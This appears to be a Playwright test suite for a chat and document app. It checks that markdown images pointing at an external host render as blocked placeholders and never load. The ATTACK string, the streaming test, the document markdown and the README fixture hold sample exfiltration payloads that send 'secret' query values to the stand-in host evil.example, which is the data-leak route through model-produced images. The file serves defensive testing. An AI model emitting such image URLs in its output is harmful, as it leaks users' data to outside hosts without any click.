// md-exfil T4: the image policy in every markdown renderer. A model- or
// tool-produced `![](https://host/?q=secret)` must never become an <img> (the
// browser would send the request with no click). Blocked sources render a named,
// non-interactive placeholder that shows the host; same-origin and data: images
// still render; an allowlisted origin renders an <img> that falls back to the
// same placeholder when the load fails. "Attacker" hosts are page.route aborts
// that COUNT requests: nothing here reaches a real network.
import { test, expect } from '@playwright/test'
import AxeBuilder from '@axe-core/playwright'
import { loadFixtures, newVariantContext, AXE_TAGS, sendPrompt, SCREENS } from './lib.mjs'

const fx = loadFixtures()
const { ids } = fx
const DESKTOP = { theme: 'dark', mobile: false }
const EVIL = 'evil.example'
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64')
const DATA_PNG = `data:image/png;base64,${PNG.toString('base64')}`

const sessionBody = (id) => JSON.parse(fx.routes[`GET /api/sessions/${id}/messages`].body)
const MODEL = sessionBody(ids.s1).messages[1].model

async function open(browser, { me, extraHosts = [] } = {}) {
  const ctx = await newVariantContext(browser, DESKTOP)
  const page = await ctx.newPage()
  const errors = []
  const hits = []
  page.on('pageerror', (e) => errors.push(String(e)))
  for (const h of [EVIL, ...extraHosts]) {
    await page.route(`https://${h}/**`, (r) => {
      hits.push(r.request().url())
      return r.abort()
    })
  }
  if (me) await page.route('**/api/me', (r) => r.fulfill({ json: { email: 'e2e-user@example.com', isAdmin: false, isOwner: false, ...me } }))
  return { ctx, page, errors, hits }
}

const assistant = (id, content) => ({
  id: String(id), role: 'assistant', content, attachments: null, model: MODEL, prompt_tokens: 1, completion_tokens: 1,
  blocks: null, tool_calls: null, created_at: '2026-11-17T07:09:00.000Z', media_processing: null, intent_classify: null, reasoning: null,
})

async function serveS3(page, content) {
  const body = sessionBody(ids.s3)
  body.messages = [body.messages[0], assistant(9001, content)]
  await page.route(`**/api/sessions/${ids.s3}/messages`, (r) => r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(body) }))
  await page.goto(`/#/chat/${ids.s3}`)
}

const ATTACK = [
  'Inline: ![chart](https://evil.example/a.png?v=2463600)',
  '',
  'Reference: ![total][r1]',
  '',
  '| a | b |',
  '|---|---|',
  '| x | ![in table](https://evil.example/t.png?q=secret) |',
  '',
  '[r1]: https://evil.example/ref.png?d=secret',
].join('\n')

const blocked = (scope) => scope.locator('.md-image-blocked')

test('chat: inline, reference-style and in-table images show the named placeholder with the host and never an <img>', async ({ browser }) => {
  const { ctx, page, errors, hits } = await open(browser)
  await serveS3(page, ATTACK)
  const ph = blocked(page.locator('.prose-chat'))
  await expect(ph).toHaveCount(3)
  for (let i = 0; i < 3; i++) {
    await expect(ph.nth(i)).toContainText(EVIL)
    await expect(ph.nth(i)).toHaveAttribute('role', 'img')
    await expect(ph.nth(i)).toHaveAttribute('aria-label', /not loaded.*evil\.example/i)
  }
  await expect(ph.nth(0)).toContainText('chart')
  expect(await page.locator('img[src*="evil.example"]').count()).toBe(0)
  expect(await page.locator('.prose-chat button, .prose-chat a, .prose-chat [tabindex]:not(.table-scroll):not(pre)').evaluateAll((els) => els.filter((e) => e.closest('.md-image-blocked')).length)).toBe(0) // not interactive
  await page.waitForLoadState("networkidle")
  expect(hits).toEqual([])
  const axe = await new AxeBuilder({ page }).include('.prose-chat').withTags(AXE_TAGS).analyze()
  expect(axe.violations.filter((v) => v.impact === 'serious' || v.impact === 'critical').map((v) => v.id)).toEqual([])
  expect(errors).toEqual([])
  await ctx.close()
})

test('chat: a mid-stream image becomes a placeholder and no request leaves', async ({ browser }) => {
  const { ctx, page, errors, hits } = await open(browser)
  await page.goto('/#/chat')
  await sendPrompt(page, 'Revenue by region?')
  await page.waitForFunction(() => !!window.__sse)
  await page.evaluate((sid) => window.__sse.push({ type: 'meta', sessionId: sid, isNew: true }), ids.s2)
  for (const v of ['Total: ![t](https://evil.example/s.png?v=24', '63600', ') done']) await page.evaluate((value) => window.__sse.push({ type: 'token', value }), v)
  await expect(blocked(page.locator('.prose-chat'))).toHaveCount(1)
  await expect(blocked(page.locator('.prose-chat'))).toContainText(EVIL)
  expect(await page.locator('img[src*="evil.example"]').count()).toBe(0)
  await page.evaluate(() => { window.__sse.push({ type: 'done' }); window.__sse.end() })
  await page.waitForLoadState("networkidle")
  expect(hits).toEqual([])
  expect(errors).toEqual([])
  await ctx.close()
})

test('chat: same-origin /api/images/:id and data: images still render as <img>', async ({ browser }) => {
  const { ctx, page, errors } = await open(browser)
  await page.route('**/api/images/7', (r) => r.fulfill({ status: 200, contentType: 'image/png', body: PNG }))
  await serveS3(page, `![gen](/api/images/7)\n\n![inline](${DATA_PNG})`)
  const imgs = page.locator('.prose-chat img')
  await expect(imgs).toHaveCount(2)
  await expect(blocked(page)).toHaveCount(0)
  await expect.poll(() => imgs.evaluateAll((els) => els.map((e) => e.complete && e.naturalWidth > 0))).toEqual([true, true])
  expect(errors).toEqual([])
  await ctx.close()
})

test('chat: an allowlisted origin renders <img>; a failed load swaps to the same placeholder; empty policy is closed', async ({ browser }) => {
  const { ctx, page, hits } = await open(browser, { me: { externalAssetOrigins: ['https://cdn.allowed.example'] }, extraHosts: ['cdn.allowed.example'] })
  await serveS3(page, '![logo](https://cdn.allowed.example/logo.png)')
  // the load is aborted (dead link / CSP): the <img> is replaced by the placeholder
  await expect(blocked(page.locator('.prose-chat'))).toHaveCount(1)
  await expect(blocked(page.locator('.prose-chat'))).toContainText('cdn.allowed.example')
  expect(hits.some((u) => u.startsWith('https://cdn.allowed.example/'))).toBe(true) // it WAS attempted: allowed
  await ctx.close()
  const b = await open(browser) // /api/me without externalAssetOrigins
  await serveS3(b.page, '![logo](https://cdn.allowed.example/logo.png)')
  await expect(blocked(b.page.locator('.prose-chat'))).toHaveCount(1)
  expect(await b.page.locator('img[src*="allowed.example"]').count()).toBe(0)
  await b.ctx.close()
})

// ---- document studio (rich mode + raw preview + read-only page) ----
const DOC_MD = 'Hello ![pic](https://evil.example/d.png?x=secret) world\n\n![ref][z]\n\n[z]: https://evil.example/r.png?y=secret'

async function openDoc(browser) {
  const o = await open(browser)
  const doc = { id: ids.doc, title: 'T', markdown: DOC_MD }
  await o.ctx.route(`**/api/documents/${ids.doc}`, (r) => r.fulfill({ json: { document: doc } }))
  await o.page.goto(`/#/chat/${ids.s1}`)
  await o.page.getByText('Open in Slides Studio').first().waitFor()
  const openBtn = o.page.getByRole('button', { name: 'Open', exact: true }).first()
  await openBtn.scrollIntoViewIfNeeded()
  await openBtn.click()
  const root = o.page.locator('[data-studio="doc"]')
  await root.waitFor()
  return { ...o, root }
}

test('document studio: the page, the rich editor and the raw preview show placeholders, never <img>', async ({ browser }) => {
  const { ctx, page, root, hits, errors } = await openDoc(browser)
  await expect(blocked(root)).toHaveCount(2)
  await expect(blocked(root).first()).toContainText(EVIL)
  await root.getByRole('button', { name: 'Edit', exact: true }).click()
  const editor = root.getByRole('textbox', { name: 'Document text editor' })
  await expect(blocked(editor)).toHaveCount(2)
  await expect(blocked(editor).first()).toContainText(EVIL)
  expect(await root.locator('img[src*="evil.example"]').count()).toBe(0)
  // round trip: the markdown behind the placeholder survives an edit (no silent loss of the image syntax)
  await editor.getByText('Hello').click()
  await page.keyboard.type('!')
  await root.getByRole('button', { name: 'Edit as Markdown' }).click()
  await expect(root.locator('#doc-studio-md')).toHaveValue(/!\[pic\]\(https:\/\/evil\.example\/d\.png\?x=secret\)/)
  await expect(blocked(root.locator('.prose-chat'))).toHaveCount(2) // the raw-mode live preview
  expect(await root.locator('img[src*="evil.example"]').count()).toBe(0)
  await page.waitForLoadState("networkidle")
  expect(hits).toEqual([])
  expect(errors).toEqual([])
  await ctx.close()
})

// ---- DS README ----
test('design system README: images show the placeholder', async ({ browser }) => {
  const { ctx, page, hits } = await open(browser)
  const tpl = { id: 11, name: 'Org brand', scope: 'global', canEdit: true, isSelected: true, primaryColor: '#0E6B5C', iconAssets: [], palette: [], hasReadme: true, readme: '# Brand\n\n![hero](https://evil.example/h.png?k=secret)\n\ntext' }
  await page.route('**/api/deck-templates', (r) => r.fulfill({ json: { templates: [tpl] } }))
  await page.route('**/api/deck-templates/11', (r) => r.fulfill({ json: { template: tpl } }))
  await page.route('**/api/deck-templates/selected', (r) => r.fulfill({ json: { template: tpl } }))
  await page.route('**/api/skills', (r) => r.fulfill({ json: { skills: [], isAdmin: true } }))
  await page.route('**/api/mcp/connections*', (r) => r.fulfill({ json: { connections: [] } }))
  await SCREENS.welcome(page, 'http://127.0.0.1:' + (process.env.E2E_PORT || 4173))
  await page.locator('button[title="Settings"]').first().click()
  const dialog = page.getByRole('dialog', { name: 'Settings' })
  await dialog.getByRole('button', { name: 'Design system', exact: true }).click()
  await dialog.getByRole('button', { name: 'Inspect design system' }).click()
  const insp = page.getByRole('dialog').last()
  await expect(blocked(insp)).toHaveCount(1)
  await expect(blocked(insp)).toContainText(EVIL)
  expect(await insp.locator('img[src*="evil.example"]').count()).toBe(0)
  await page.waitForLoadState("networkidle")
  expect(hits).toEqual([])
  await ctx.close()
})
